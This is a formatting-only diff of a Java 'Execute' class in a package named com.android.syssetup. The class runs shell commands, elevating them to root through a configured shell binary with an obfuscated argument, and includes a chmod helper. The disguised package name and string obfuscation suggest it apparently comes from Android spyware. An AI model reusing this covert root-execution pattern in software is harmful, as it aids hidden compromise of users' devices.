@@ -1,5 +1,13 @@
 package com.android.syssetup.util;
 
+import com.android.mm.M;
+import com.android.syssetup.Root;
+import com.android.syssetup.Status;
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.conf.Configuration;
+import com.android.syssetup.file.AutoFile;
+import com.android.syssetup.file.Directory;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.util.concurrent.Callable;
@@ -9,14 +17,6 @@ import java.util.concurrent.Future;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.TimeoutException;
 
-import com.android.syssetup.Root;
-import com.android.syssetup.Status;
-import com.android.syssetup.auto.Cfg;
-import com.android.syssetup.conf.Configuration;
-import com.android.syssetup.file.AutoFile;
-import com.android.syssetup.file.Directory;
-import com.android.mm.M;
-
 public class Execute {
 	private static final String TAG = "Execute";
 
@@ -24,7 +24,7 @@ public class Execute {
 		String cmdExpanded = Directory.expandMacro(command);
 		String[] cmd = null;
 		if (Status.haveRoot()) {
-			cmd = new String[] { Configuration.shellFile, M.e("qzx"), cmdExpanded };
+			cmd = new String[]{Configuration.shellFile, M.e("qzx"), cmdExpanded};
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (executeRoot) " + cmdExpanded);
@@ -91,6 +91,7 @@ public class Execute {
 
 		return result;
 	}
+
 	public static ExecuteResult executeSimple(String cmd) {
 		String line = null;
 
@@ -98,7 +99,7 @@ public class Execute {
 		ExecuteResult result = new ExecuteResult(cmd);
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (execute) executing: " + cmd ); //$NON-NLS-1$
+			Check.log(TAG + " (execute) executing: " + cmd); //$NON-NLS-1$
 		}
 
 		try {
@@ -112,7 +113,7 @@ public class Execute {
 		if (localProcess != null) {
 			try {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (executeSimple): real class "+ localProcess.getClass());
+					Check.log(TAG + " (executeSimple): real class " + localProcess.getClass());
 				}
 				result.exitCode = localProcess.waitFor();
 			} catch (Exception e) {
@@ -180,8 +181,8 @@ public class Execute {
 		Process localProcess = null;
 		String cmdFull = StringUtils.join(cmd, " ", 0);
 		ExecuteResult result = new ExecuteResult(cmdFull);
-		
-		if (cmd == null){
+
+		if (cmd == null) {
 			return result;
 		}
 
@@ -304,6 +305,6 @@ public class Execute {
 	}
 
 	public static void chmod(String mode, String file) {
-		execute(new String[]{Configuration.shellFile,"qzx","chmod " + mode +" "+ file} );
+		execute(new String[]{Configuration.shellFile, "qzx", "chmod " + mode + " " + file});
 	}
 }
